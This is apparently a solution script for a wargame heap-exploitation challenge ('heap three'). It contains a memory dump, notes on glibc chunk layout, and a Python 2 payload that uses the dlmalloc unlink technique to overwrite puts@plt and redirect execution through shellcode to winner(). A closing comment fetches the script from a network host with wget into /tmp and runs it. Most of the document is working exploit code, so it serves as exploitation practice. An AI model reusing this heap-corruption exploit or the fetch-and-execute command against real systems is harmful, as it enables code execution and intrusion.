'''
0xf7e69004:	0x00000029	0x41414141	0x00000000	0x00000000
0xf7e69014:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e69024:	0x00000000	0x00000000	0x00000029	0x42424242
0xf7e69034:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e69044:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e69054:	0x00000029	0x43434343	0x00000000	0x00000000
0xf7e69064:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e69074:	0x00000000	0x00000000	0x000fff89	0x00000000
0xf7e69084:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e69094:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e690a4:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e690b4:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e690c4:	0x00000000	0x00000000

struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
};

1) turn fastbins into small bins (size)
2) unset prev_inuse flag (LSB=0) so that a and b are coalesced using unlink macro
3) set prev_size to -4 (also avoid nullbytes)

we write the value at c + 4 (prev_size) + 12 (prev->bk) to the address specified at c + 4 (prev_size) + 8 + 12 (prev->fd)
'''
import struct

buf = "\x90" * 5
buf += "\x68\xd5\x87\x04\x08\xc3" # jmp winner()
buf += "\x90" * 7
#buf += "\xcc"
#mov    eax,0x80487d5
#jmp    eax

buf += " " + "B" * 32
buf += struct.pack("<I", 0xffffffff + 1 - 4) # prev_size or size of fake chunk could be anything, important part is that LSB=0
buf += struct.pack("<I", 0xffffffb0) # size that is added when looking for fake chunk (-4)
buf += " \xff\xff\xff\xff"
buf += struct.pack("<I", 0x804c13c - 12) # target ->puts@plt
buf += struct.pack("<I", 0xf7e6900c) # word to write -> heap addr as write is performed in both directions (code segment not writable so we can't put address of winner() here)

buf += " CCCC"

print buf

#./heap-three `wget -q -O /tmp/input.py http://192.168.8.119:8000/heap-three.py && python /tmp/input.py`

